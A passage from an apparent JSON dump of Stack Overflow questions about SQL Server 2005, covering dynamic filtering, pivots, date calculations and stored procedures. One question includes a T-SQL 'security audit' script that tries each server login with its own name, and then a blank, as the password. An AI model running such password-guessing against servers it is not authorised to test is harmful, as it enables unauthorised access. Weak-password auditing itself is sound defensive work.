D.element.value('@Column','nvarchar(3)') = 'cvv2'),\n@ccexpires = (SELECT D.element.value('@Value','nvarchar(10)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(10)') = 'ccexpires'),\n@nationalid = (SELECT D.element.value('@Value','nvarchar(15)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(15)') = 'nationalid'),\n@upstracking = (SELECT D.element.value('@Value','nvarchar(24)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(24)') = 'upstracking'),\n@occupation = (SELECT D.element.value('@Value','nvarchar(70)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(70)') = 'occupation'),\n@company = (SELECT D.element.value('@Value','nvarchar(70)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(70)') = 'company'),\n@domain = (SELECT D.element.value('@Value','nvarchar(70)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(70)') = 'domain'),\n@bloodtype = (SELECT D.element.value('@Value','nvarchar(3)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(3)') = 'bloodtype'),\n@feetinches = (SELECT D.element.value('@Value','nvarchar(6)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(6)') = 'feetinches'),\n@guid = (SELECT D.element.value('@Value','nvarchar(36)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(36)') = 'guid'),\n@StateProvinceName = (SELECT D.element.value('@Value','varchar(50)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','varchar(50)') = 'StateProvinceName')\n--CREATE THE TEMP TABLE\nCREATE TABLE #Temp (\nROWCOUNTID int IDENTITY PRIMARY KEY,\nPK  int\n)\n--MAGIC HERE\nINSERT INTO #Temp \nSELECT  t1.FakeNameID as pk\nFROM    dbo.vw_Fakename t1\nWHERE   \nCAST(FakeNameID as varchar(100)) LIKE CASE WHEN IsNull(@FakeNameID,-1)&gt;0 THEN Cast(@FakeNameID as varchar(100)) ELSE '%' END    AND\ngender LIKE CASE WHEN Len(IsNull(@gender,''))&gt;0 THEN @gender ELSE '%' END AND\ngivenname LIKE CASE WHEN Len(IsNull(@givenname,''))&gt;0 THEN @givenname ELSE '%' END AND\nmiddleinitial LIKE CASE WHEN Len(IsNull(@middleinitial,''))&gt;0 THEN @middleinitial ELSE '%' END AND\nsurname LIKE CASE WHEN Len(IsNull(@surname,''))&gt;0 THEN @surname ELSE '%' END AND\nstreetaddress LIKE CASE WHEN Len(IsNull(@streetaddress,''))&gt;0 THEN @streetaddress ELSE '%' END AND\ncity LIKE CASE WHEN Len(IsNull(@city,''))&gt;0 THEN @city ELSE '%' END AND\nzipcode LIKE CASE WHEN Len(IsNull(@zipcode,''))&gt;0 THEN @zipcode ELSE '%' END AND\ncountry LIKE CASE WHEN Len(IsNull(@country,''))&gt;0 THEN @country ELSE '%' END AND\nemailaddress LIKE CASE WHEN Len(IsNull(@emailaddress,''))&gt;0 THEN @emailaddress ELSE '%' END AND\npassword LIKE CASE WHEN Len(IsNull(@password,''))&gt;0 THEN @password ELSE '%' END AND\ntelephonenumber LIKE CASE WHEN Len(IsNull(@telephonenumber,''))&gt;0 THEN @telephonenumber ELSE '%' END AND\nmaidenname LIKE CASE WHEN Len(IsNull(@maidenname,''))&gt;0 THEN @maidenname ELSE '%' END AND\ncctype LIKE CASE WHEN Len(IsNull(@cctype,''))&gt;0 THEN @cctype ELSE '%' END AND\nccnumber LIKE CASE WHEN Len(IsNull(@ccnumber,''))&gt;0 THEN @ccnumber ELSE '%' END AND\ncvv2 LIKE CASE WHEN Len(IsNull(@cvv2,''))&gt;0 THEN @cvv2 ELSE '%' END AND\nccexpires LIKE CASE WHEN Len(IsNull(@ccexpires,''))&gt;0 THEN @ccexpires ELSE '%' END AND\nnationalid LIKE CASE WHEN Len(IsNull(@nationalid,''))&gt;0 THEN @nationalid ELSE '%' END AND\nupstracking LIKE CASE WHEN Len(IsNull(@upstracking,''))&gt;0 THEN @upstracking ELSE '%' END AND\noccupation LIKE CASE WHEN Len(IsNull(@occupation,''))&gt;0 THEN @occupation ELSE '%' END AND\ncompany LIKE CASE WHEN Len(IsNull(@company,''))&gt;0 THEN @company ELSE '%' END AND\ndomain LIKE CASE WHEN Len(IsNull(@domain,''))&gt;0 THEN @domain ELSE '%' END AND\nbloodtype LIKE CASE WHEN Len(IsNull(@bloodtype,''))&gt;0 THEN @bloodtype ELSE '%' END AND\nfeetinches LIKE CASE WHEN Len(IsNull(@feetinches,''))&gt;0 THEN @feetinches ELSE '%' END AND\nguid LIKE CASE WHEN Len(IsNull(@guid,''))&gt;0 THEN @guid ELSE '%' END AND\nStateProvinceName LIKE CASE WHEN Len(IsNull(@StateProvinceName,''))&gt;0 THEN @StateProvinceName ELSE '%' END\nORDER BY\nCASE WHEN @OrderBy = 'FakeNameID' AND @OrderByDirection = 'asc' THEN FakeNameID END,\nCASE WHEN @OrderBy = 'FakeNameID' AND @OrderByDirection = 'desc' THEN FakeNameID END DESC,\nCASE WHEN @OrderBy = 'gender' AND @OrderByDirection = 'asc' THEN gender END,\nCASE WHEN @OrderBy = 'gender' AND @OrderByDirection = 'desc' THEN gender END DESC,\nCASE WHEN @OrderBy = 'givenname' AND @OrderByDirection = 'asc' THEN givenname END,\nCASE WHEN @OrderBy = 'givenname' AND @OrderByDirection = 'desc' THEN givenname END DESC,\nCASE WHEN @OrderBy = 'middleinitial' AND @OrderByDirection = 'asc' THEN middleinitial END,\nCASE WHEN @OrderBy = 'middleinitial' AND @OrderByDirection = 'desc' THEN middleinitial END DESC,\nCASE WHEN @OrderBy = 'surname' AND @OrderByDirection = 'asc' THEN surname END,\nCASE WHEN @OrderBy = 'surname' AND @OrderByDirection = 'desc' THEN surname END DESC,\nCASE WHEN @OrderBy = 'streetaddress' AND @OrderByDirection = 'asc' THEN streetaddress END,\nCASE WHEN @OrderBy = 'streetaddress' AND @OrderByDirection = 'desc' THEN streetaddress END DESC,\nCASE WHEN @OrderBy = 'city' AND @OrderByDirection = 'asc' THEN city END,\nCASE WHEN @OrderBy = 'city' AND @OrderByDirection = 'desc' THEN city END DESC,\nCASE WHEN @OrderBy = 'zipcode' AND @OrderByDirection = 'asc' THEN zipcode END,\nCASE WHEN @OrderBy = 'zipcode' AND @OrderByDirection = 'desc' THEN zipcode END DESC,\nCASE WHEN @OrderBy = 'country' AND @OrderByDirection = 'asc' THEN country END,\nCASE WHEN @OrderBy = 'country' AND @OrderByDirection = 'desc' THEN country END DESC,\nCASE WHEN @OrderBy = 'emailaddress' AND @OrderByDirection = 'asc' THEN emailaddress END,\nCASE WHEN @OrderBy = 'emailaddress' AND @OrderByDirection = 'desc' THEN emailaddress END DESC,\nCASE WHEN @OrderBy = 'password' AND @OrderByDirection = 'asc' THEN password END,\nCASE WHEN @OrderBy = 'password' AND @OrderByDirection = 'desc' THEN password END DESC,\nCASE WHEN @OrderBy = 'telephonenumber' AND @OrderByDirection = 'asc' THEN telephonenumber END,\nCASE WHEN @OrderBy = 'telephonenumber' AND @OrderByDirection = 'desc' THEN telephonenumber END DESC,\nCASE WHEN @OrderBy = 'maidenname' AND @OrderByDirection = 'asc' THEN maidenname END,\nCASE WHEN @OrderBy = 'maidenname' AND @OrderByDirection = 'desc' THEN maidenname END DESC,\nCASE WHEN @OrderBy = 'birthday' AND @OrderByDirection = 'asc' THEN birthday END,\nCASE WHEN @OrderBy = 'birthday' AND @OrderByDirection = 'desc' THEN birthday END DESC,\nCASE WHEN @OrderBy = 'cctype' AND @OrderByDirection = 'asc' THEN cctype END,\nCASE WHEN @OrderBy = 'cctype' AND @OrderByDirection = 'desc' THEN cctype END DESC,\nCASE WHEN @OrderBy = 'ccnumber' AND @OrderByDirection = 'asc' THEN ccnumber END,\nCASE WHEN @OrderBy = 'ccnumber' AND @OrderByDirection = 'desc' THEN ccnumber END DESC,\nCASE WHEN @OrderBy = 'cvv2' AND @OrderByDirection = 'asc' THEN cvv2 END,\nCASE WHEN @OrderBy = 'cvv2' AND @OrderByDirection = 'desc' THEN cvv2 END DESC,\nCASE WHEN @OrderBy = 'ccexpires' AND @OrderByDirection = 'asc' THEN ccexpires END,\nCASE WHEN @OrderBy = 'ccexpires' AND @OrderByDirection = 'desc' THEN ccexpires END DESC,\nCASE WHEN @OrderBy = 'nationalid' AND @OrderByDirection = 'asc' THEN nationalid END,\nCASE WHEN @OrderBy = 'nationalid' AND @OrderByDirection = 'desc' THEN nationalid END DESC,\nCASE WHEN @OrderBy = 'upstracking' AND @OrderByDirection = 'asc' THEN upstracking END,\nCASE WHEN @OrderBy = 'upstracking' AND @OrderByDirection = 'desc' THEN upstracking END DESC,\nCASE WHEN @OrderBy = 'occupation' AND @OrderByDirection = 'asc' THEN occupation END,\nCASE WHEN @OrderBy = 'occupation' AND @OrderByDirection = 'desc' THEN occupation END DESC,\nCASE WHEN @OrderBy = 'company' AND @OrderByDirection = 'asc' THEN company END,\nCASE WHEN @OrderBy = 'company' AND @OrderByDirection = 'desc' THEN company END DESC,\nCASE WHEN @OrderBy = 'domain' AND @OrderByDirection = 'asc' THEN domain END,\nCASE WHEN @OrderBy = 'domain' AND @OrderByDirection = 'desc' THEN domain END DESC,\nCASE WHEN @OrderBy = 'bloodtype' AND @OrderByDirection = 'asc' THEN bloodtype END,\nCASE WHEN @OrderBy = 'bloodtype' AND @OrderByDirection = 'desc' THEN bloodtype END DESC,\nCASE WHEN @OrderBy = 'pounds' AND @OrderByDirection = 'asc' THEN pounds END,\nCASE WHEN @OrderBy = 'pounds' AND @OrderByDirection = 'desc' THEN pounds END DESC,\nCASE WHEN @OrderBy = 'kilograms' AND @OrderByDirection = 'asc' THEN kilograms END,\nCASE WHEN @OrderBy = 'kilograms' AND @OrderByDirection = 'desc' THEN kilograms END DESC,\nCASE WHEN @OrderBy = 'feetinches' AND @OrderByDirection = 'asc' THEN feetinches END,\nCASE WHEN @OrderBy = 'feetinches' AND @OrderByDirection = 'desc' THEN feetinches END DESC,\nCASE WHEN @OrderBy = 'centimeters' AND @OrderByDirection = 'asc' THEN centimeters END,\nCASE WHEN @OrderBy = 'centimeters' AND @OrderByDirection = 'desc' THEN centimeters END DESC,\nCASE WHEN @OrderBy = 'guid' AND @OrderByDirection = 'asc' THEN guid END,\nCASE WHEN @OrderBy = 'guid' AND @OrderByDirection = 'desc' THEN guid END DESC,\nCASE WHEN @OrderBy = 'latitude' AND @OrderByDirection = 'asc' THEN latitude END,\nCASE WHEN @OrderBy = 'latitude' AND @OrderByDirection = 'desc' THEN latitude END DESC,\nCASE WHEN @OrderBy = 'longitude' AND @OrderByDirection = 'asc' THEN longitude END,\nCASE WHEN @OrderBy = 'longitude' AND @OrderByDirection = 'desc' THEN longitude END DESC,\nCASE WHEN @OrderBy = 'StateProvinceName' AND @OrderByDirection = 'asc' THEN StateProvinceName END,\nCASE WHEN @OrderBy = 'StateProvinceName' AND @OrderByDirection = 'desc' THEN StateProvinceName END DESC,\nCASE WHEN @OrderBy = 'GenderName' AND @OrderByDirection = 'asc' THEN GenderName END,\nCASE WHEN @OrderBy = 'GenderName' AND @OrderByDirection = 'desc' THEN GenderName END DESC\nDECLARE @TotalRecords decimal(10,5)\nDECLARE @TotalNumberOfPages int\nSET @TotalRecords = (SELECT COUNT(*) FROM #Temp)\nSET @TotalNumberOfPages = CEILING(@TotalRecords/@iPageSize)\n--FINAL SELECT\nSELECT  t1.*,\n@TotalNumberOfPages as TotalNumberOfPages\nFROM    dbo.vw_Fakename t1\nJOIN #temp t on t1.FakeNameID = t.pk\nWHERE\nt.ROWCOUNTID BETWEEN @iStartRecord AND @iEndRecord  \n--DROP TEMP TABLE\nDROP TABLE #temp\n</code></pre>\n\n<p>Usage</p>\n\n<pre><code>USE [TestDatabase]\nGO\nset statistics time on\nDECLARE @return_value int\nEXEC    @return_value = [dbo].[vw_Fakename_SelectFilter]\n@Filter = N'\n&lt;ArrayOfDataFilter xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n&lt;DataFilter Column=\"givenname\" Value=\"adam\"&gt;&lt;/DataFilter&gt;\n&lt;DataFilter Column=\"surname\" Value=\"adey\"&gt;&lt;/DataFilter&gt;\n&lt;/ArrayOfDataFilter&gt;',\n@OrderBy = N'surname',\n@OrderByDirection = N'asc',\n@iPageSize = 50,\n@iPageNumber = 0\nGO\n</code></pre>\n\n<p>I have been using a list from <a href=\"http://www.fakenamegenerator.com/order.php\" rel=\"nofollow\">fakenamegenerator</a> on 50,000 random names and having been getting statistics of (blank entries removed):</p>\n\n<pre><code>SQL Server Execution Times:\nCPU time = 46 ms,  elapsed time = 37 ms.\nSQL Server Execution Times:\nCPU time = 47 ms,  elapsed time = 282 ms.\nSQL Server Execution Times:\nCPU time = 93 ms,  elapsed time = 499 ms.\n</code></pre>\n\n<p>So the question I have is this: Is there a better/faster way to achieve the same results?</p>\n\n<p>Many thanks!\nAdam</p>\n"},{"tags":["sql","mysql","sql-server-2005","ssms"],"answer_count":10,"favorite_count":2,"up_vote_count":12,"down_vote_count":1,"view_count":673,"score":11,"question_id":4040661,"title":"GUI tools for mysql 5.0","body":"<p>Is their any GUI-interface for MySQL, like Microsoft SQL Server 2005 Server Management Studio provides? Because basically I am operating MySQL with command prompt interface.</p>\n"},{"tags":["sql","sql-server-2005","datetime"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":11359266,"title":"SQL server out of hour calculation","body":"<h2>Out of hour calculation</h2>\n\n<p>An out of hour calendar defined as below,Here WeekNumber starts from 1 = Monday to 5 = Friday </p>\n\n<pre><code>CalendarId WeekNumber   StartTime           EndTime         \n600         1           1900-01-01 00:00    1900-01-01 08:00    \n600         1           1900-01-01 18:00    1900-01-01 23:59    \n600         2           1900-01-01 00:00    1900-01-01 08:00    \n600         2           1900-01-01 18:00    1900-01-01 23:59    \n600         3           1900-01-01 00:00    1900-01-01 08:00    \n600         3           1900-01-01 18:00    1900-01-01 23:59    \n600         4           1900-01-01 00:00    1900-01-01 08:00    \n600         4           1900-01-01 18:00    1900-01-01 23:59    \n600         5           1900-01-01 00:00    1900-01-01 08:00    \n600         5           1900-01-01 18:00    1900-01-01 23:59    \n</code></pre>\n\n<p>I would like to apply this calendar to another table called events to find records falls in these day and times ?</p>\n\n<h2>Edit</h2>\n\n<p>The Structure of event table as follows</p>\n\n<pre><code>EventID StartDateTime       TotalTimeInSec  WeekNumber  \n1       2009-07-05 07:44     100                1 \n2       2009-07-05 08:40     200                1\n3       2009-07-05 09:35     150                1\n4       2009-07-05 10:37     200                1\n5       2009-07-05 19:37     200                1\n6       2009-07-05 20:37     200                1\n</code></pre>\n\n<p>The required <strong>output</strong> will be after appyling the calendar </p>\n\n<pre><code>EventID StartDateTime       TotalTimeInSec  WeekNumber  \n1       2009-07-05 07:44     100                1 \n5       2009-07-05 19:37     200                1\n6       2009-07-05 20:37     200                1\n</code></pre>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","code-generation"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":937,"score":3,"question_id":6393917,"title":"free SQL Server stored procedure generator?","body":"<p>I have seen some SQL Server stored procedure code generator which generates scripts on selecting a table.</p>\n\n<p>Kindly recommend a free tool that generate SQL Server SP but what I am looking for is:</p>\n\n<ol>\n<li>It generate scripts in db, where user may not have to copy the code and execute the script in db.</li>\n<li>It can generate SP for a selected schema, I mean user may not need to select a table one by one, just on selecting db it may generate scripts for all tables.</li>\n</ol>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":11374138,"title":"SQL Query SQLDMO","body":"<p>Following is my SQL Query which work fine on  SQL server 2005 ,but on SQL Server 2008 its throws the Error sp_Security error: Unable to create SQLDMO Server object</p>\n\n<p>Thanks.</p>\n\n<p>SQL Query</p>\n\n<pre><code>DECLARE @object int\nDECLARE @hr int\nDECLARE @hack smallint\nDECLARE @return varchar(255)\nDECLARE @Results nvarchar(255)\nDECLARE @server sysname\nDECLARE @login sysname\nDECLARE @tsql varchar(1500)\n\nset @server = 'YOGESH\\SQLEXPRESS'\n\nEXEC @hr = sp_OACreate 'SQLDMO.SQLServer', @object OUT\n\nIF @hr &lt; 0\nBEGIN\n   RAISERROR('sp_Security error: Unable to create SQLDMO Server object', 0, 1)\n   RETURN\nEND\n\nEXEC @hr = sp_OASetProperty @object,'LoginSecure', 'False'\n\nIF @hr &lt; 0\nBEGIN\n   RAISERROR('sp_Security error: Unable to set LoginSecure', 0, 1)\n   GOTO ExitProc\nEND\n\nPrint ' Security Audit for Server : ' + @server\n\nset @tsql = 'DECLARE login_cursor CURSOR FOR SELECT loginname FROM master.dbo.syslogins order by loginname' \n\nexec (@tsql)\n\nOPEN login_cursor\n\nFETCH NEXT FROM login_cursor\nINTO @login\n\nWHILE @@FETCH_STATUS = 0\nBEGIN\n   set @hack = 0\n   set @Results = 'Connect(\"' + @server +'\",\"'+@login+'\",\"'+@login+'\")'\n\n   EXEC @hr = sp_OAMethod @object, @Results\n\n   IF @hr = 0\n   begin\n      print 'login : ' + @login + ' security problem with password ' + @login\n      EXEC @hr = sp_OAMethod @object, 'Disconnect'\n\n      set @hack = 1\n   end\n\n   IF (@hack = 0)\n   begin\n     set @Results = 'Connect(\"' + @server +'\",\"'+@login+'\",\"'+'\")'\n\n     EXEC @hr = sp_OAMethod @object, @Results\n\n     IF @hr = 0\n     begin\n        print 'login : ' + @login + ' security problem with password NULL'\n\n        EXEC @hr = sp_OAMethod @object, 'Disconnect'\n\n        set @hack = 1\n     end\n   end\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","query"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":745,"score":1,"question_id":1954141,"title":"Help needed in AdventureWorks in a sql query","body":"<p>I was just playing with adventureworks database in sqlserver. I got stuck in a query.\nI wanted to Select all titles from HumanResources.Employee which are either 'Male' or 'Female' but not both.\ni.e if title Accountant is Male and Female both I want to leave that title.\nI need only those titles where Gender is either Male or Female.</p>\n\n<p>I have done this till yet. </p>\n\n<blockquote>\n  <p>select distinct(title) from humanresources.employee where gender='M'\n  <br>\n  select distinct(title) from humanresources.employee where gender='F'</p>\n</blockquote>\n\n<p>Probably a join between these two queries, would work. But If you have any other solution, please let me know.</p>\n\n<p>It is not a homework. :)</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005","pivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":11370558,"title":"SQL Pivot Table isn't working","body":"<p>SQL 2005 </p>\n\n<p>I have a temp table: </p>\n\n<pre><code> Year         PercentMale   PercentFemale  PercentHmlss   PercentEmployed  TotalSrvd\n 2008           100                0           0              100              1\n 2009           55                40           0               80             20\n 2010           64                35           0               67            162\n 2011           69                27           0               34            285\n 2012           56                43          10                1             58\n</code></pre>\n\n<p>and I want to create a query to display the data like this: </p>\n\n<pre><code>                    2008    2009    2010    2011    2012\n PercentMale         100     55      64      69      56 \n PercentFemale        -      40      35      27      43 \n PercentHmlss         -      -       -       -       10 \n PercentEmployed     100     80      67      34      1 \n TotalSrvd            1      20     162     285      58 \n</code></pre>\n\n<p>Can I use a pivot table to accomplish this? If so, how? I've tried using a pivot but have found no success. </p>\n\n<pre><code> select PercentHmlss,PercentMale,Percentfemale,\n     PercentEmployed,[2008],[2009],[2010],[2011],[2012] from \n\n (select PercentHmlss,PercentMale, Percentfemale, PercentEmployed,\n     TotalSrvd,year from @TempTable)as T\n\n  pivot (sum (TotalSrvd) for year \n     in ([2008],[2009],[2010],[2011],[2012])) as pvt\n</code></pre>\n\n<p>This is the result:</p>\n\n<pre><code> PercentHmlss   PercentMale     Percentfemale PercentEmployed [2008]  [2009]    [2010]      [2011]   [2012]\n    0               55              40            80           NULL     20      NULL         NULL     NULL\n    0               64              35            67           NULL    NULL     162            NULL  NULL\n    0               69              27            34           NULL    NULL     NULL          285     NULL\n    0              100               0           100             1     NULL     NULL         NULL    NULL\n   10               56              43             1           NULL    NULL     NULL         NULL     58\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","tsql","encoding","base64"],"answer_count":3,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":7147,"score":12,"question_id":5082345,"title":"Base64 encoding in SQL Server 2005 T-SQL","body":"<p>I'd like to write a T-SQL query where I encode a string as a Base64 string.  Surprisingly, I can't find any native T-SQL functions for doing Base64 encoding.  Does a native function exist?  If not, what's the best way to do Base64 encoding in T-SQL?</p>\n"},{"tags":["sql","sql-server-2005","calculated-columns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":11367369,"title":"Calculating holiday dates","body":"<p>I have to create \"holiday\" table and then create php script so I could show it on my site.</p>\n\n<p>Holidays can be specific, like 15.05.2012 - 15-th of the may.</p>\n\n<p>And non-specific: First(or second, third) sunday of july</p>\n\n<p>Is there any way to create calculated column, so this phrase \"First(or second, third) sunday of july\", could turn into x.07.2012. </p>\n"},{"tags":["sql","sql-server-2008","query","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":252,"score":2,"question_id":11345041,"title":"How to display the exact age in Year Month Day format in SQL Server","body":"<p>I am stuck with my query. I have a table called <code>Patient</code>. In this table a column has patient <code>DOB</code>. Actually I want to display the <strong>exact</strong> age of the patient.</p>\n\n<p>For example:</p>\n\n<pre><code>PatName   DOB (MM/dd/yyyy)   Age\na         06/02/1947         65 Years 1 Month/s 3 Days \nb         07/10/1947         64 Years 11 Month/s 25 Days \nc         -----------        -----------------------      \n</code></pre>\n\n<p>I want to display the age of the above format.</p>\n\n<p>I have already googled about this but nobody helped. </p>\n\n<p>If you have any query regarding this pls post that.</p>\n\n<p>Thanks</p>\n"},{"tags":["database","sql-server-2005","visual-studio-2008","visual-c++"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":11357195,"title":"connect sql2005 database from vc++","body":"<p>I want to connect my application with sql server2005 express and my application on vs2008.</p>\n\n<p>the connection string is:</p>\n\n<pre><code>db.Open(NULL, FALSE, FALSE, _T(\"ODBC;Driver={SQL Native Client};Server=ESS10\\SQLEXPRESS;Database=C:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Data\\\\testingsql.mdf;Trusted_Connection=yes;\")))\n</code></pre>\n\n<p>but when I debug the code the pop box open.</p>\n\n<p><img src=\"http://i.stack.imgur.com/5ebQR.png\" alt=\"enter image description here\">\n Any one suggest that how to resolve this problem.</p>\n"},{"tags":["c#","sql","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":255,"score":0,"question_id":11354287,"title":"SQL IN Clause In Stored Procedure","body":"<p>I have a C# app that passes in the following data:</p>\n\n<p>datasetID = 10;\nuserID = 1;\nvarnames = \"'ACT97','ACTCHNG','ACTQTR2','ACTSCOR2'\";</p>\n\n<p>The stored procedure is:</p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER PROCEDURE [dbo].[s_LockCheck]\n-- Add the parameters for the stored procedure here\n@varNames VARCHAR(max),\n@datasetID INT,\n@userID INT\nAS\nBEGIN\n-- SET NOCOUNT ON added to prevent extra result sets from\n-- interfering with SELECT statements.\nSET NOCOUNT ON\n\nSELECT COUNT(*) as locked FROM VarLocks WHERE var_name IN (@varNames) AND dataset_id = @datasetID AND user_id != @userID AND is_locked = 1\n\nEND\n</code></pre>\n\n<p>But when I call it like so, it is returning a count of 0 when it should be higher than that:</p>\n\n<pre><code>exec s_LockCheck \"'ACT97','ACTCHNG','ACTQTR2','ACTSCOR2'\", 88, 14\n</code></pre>\n\n<p>Each ACTXXX above is a varname from the column, var_name.</p>\n\n<p>Why isn't it doing the IN Clause correctly?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":11352513,"title":"Join subquery with min","body":"<p>I'm pulling my hair out over a subquery that I'm using to avoid about 100 duplicates (out of about 40k records).  The records that are duplicated are showing up because they have 2 dates in h2.datecreated for a valid reason, so I can't just scrub the data.  </p>\n\n<p>I'm trying to get only the earliest date to return.  The first subquery (that starts with \"select distinct address_id\", with the MIN) works fine on it's own...no duplicates are returned.  So it would seem that the left join (or just plain join...I've tried that too) couldn't possibly see the second h2.datecreated, since it doesn't even show up in the subquery.  But when I run the whole query, it's returning 2 values for some ipc.mfgid's, one with the h2.datecreated that I want, and the other one that I don't want.  </p>\n\n<p>I know it's got to be something really simple, or something that just isn't possible.  It really seems like it should work!  This is MSSQL.  Thanks!</p>\n\n<pre><code>select distinct ipc.mfgid as IPC, h2.datecreated,\ncase when ad.Address is null\nthen ad.buildingname end as Address, cast(trace.name as varchar) \n    + '-' + cast(trace.Number       as varchar) as ONT, \n c.ACCOUNT_Id,\ncase when h.datecreated is not null then h.datecreated\n     else  h2.datecreated end as Install\nfrom equipmentjoin as ipc\nleft join historyjoin as h on ipc.id = h.EQUIPMENT_Id \n   and h.type like 'add'\nleft join circuitjoin as c on ipc.ADDRESS_Id = c.ADDRESS_Id \n           and c.GRADE_Code like '%hpna%'\njoin (select distinct address_id, equipment_id,  \n     min(datecreated) as datecreated, comment\n     from history where comment like 'MAC: 5%' group by equipment_id, address_id, comment)\n          as h2 on c.address_id = h2.address_id\nleft join (select car.id, infport.name, carport.number, car.PCIRCUITGROUP_Id\n     from circuit as car (NOLOCK)  \n     join port as carport (NOLOCK) on car.id = carport.CIRCUIT_Id\n      and carport.name like 'lead%'\n      and car.GRADE_Id = 29 \n     join circuit as inf (NOLOCK) on car.CCIRCUITGROUP_Id = inf.PCIRCUITGROUP_Id\n     join port as infport (NOLOCK) on inf.id = infport.CIRCUIT_Id\n     and infport.name like '%olt%' )\n as trace on c.ccircuitgroup_id = trace.pcircuitgroup_id\njoin addressjoin as ad (NOLOCK) on ipc.address_id = ad.id\n</code></pre>\n"},{"tags":["c#","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":8,"view_count":188,"score":-7,"question_id":11157272,"title":"Stored Procedure in sql server 2005","body":"<p>I use the following function for insert the value in database through the stored procedure.but i have the exception in <code>sqlConnection.Open()</code>;How to solve this?   </p>\n\n<pre><code>  try\n        {\n            string dbConnectionString = \"something\";\n            SqlConnection sqlConnection = new SqlConnection(dbConnectionString);\n            SqlCommand command = new SqlCommand(\"sp_Test\", sqlConnection);\n            command.CommandType = CommandType.StoredProcedure;\n            command.Parameters.AddWithValue(\"@id \", SqlDbType.Int).Value = TextBox1.Text;\n            command.Parameters.AddWithValue(\"@FullName\", SqlDbType.VarChar).Value = TextBox2.Text;\n            sqlConnection.Open();\n            command.ExecuteNonQuery();\n            sqlConnection.Close();\n        }\n        catch (SqlException ex)\n        {\n            Console.WriteLine(\"SQL Error\" + ex.Message.ToString());\n\n        }\n</code></pre>\n"},{"tags":["sql","database","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11350241,"title":"How to select a column in the next row?","body":"<p>How can I select QuestionId in the next row via stored procedure? </p>\n\n<p>(Client side: a question(QuestionId:3) will be shown on screen. When next button is clicked, next question(QuestionId:7) will be shown).</p>\n\n<p><strong>Note that;</strong> \nQuestionId has to be changed incrementally and continuously according to RowId after every execution(like 1-3-7-8...). Also any question can be deleted so it is important to keep the order.</p>\n\n<pre><code>+-------+------------+--------------+\n| RowId | QuestionId | QuestionText |\n+-------+------------+--------------+\n| 1     | 1          | aaaa         |\n| 2     | 3          | bbbb         |\n| 3     | 7          | cccc         |\n| 4     | 8          | dddd         |\n| 5     | 13         | eeee         |\n| 6     | 17         | ffff         |\n| 7     | 24         | gggg         |\n| 8     | 30         | hhhh         |\n+-------+------------+--------------+\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":11347794,"title":"Syntax error when trying to use CONVERT within PIVOT","body":"<p>When I try to execute the query below, I get error </p>\n\n<blockquote>\n  <p>Incorrect syntax near the keyword 'convert' </p>\n</blockquote>\n\n<p>and I'm not sure where I made mistake. The data type for qty field is nchar so I used convert function for finding totals.</p>\n\n<pre><code>select column_date, [red] as red, [blue] as blue, [green] as green, [yellow] as yellow \nfrom\n(select * from table1) as t1\npivot\n(\nsum(convert(int,qty)) \nFor color in \n([red], [blue], [green], [yellow])\n) as SumofQuantityforeachcolor\n</code></pre>\n\n<p>Here is the table</p>\n\n<pre><code>column_date | color | qty | supplier\n1 June 2012 | red   | 2   | XY\n1 June 2012 | red   | 1   | AB\n1 June 2012 | blue  | 4   | CD\n1 June 2012 | blue  | 1   | XY\n2 June 2012 | 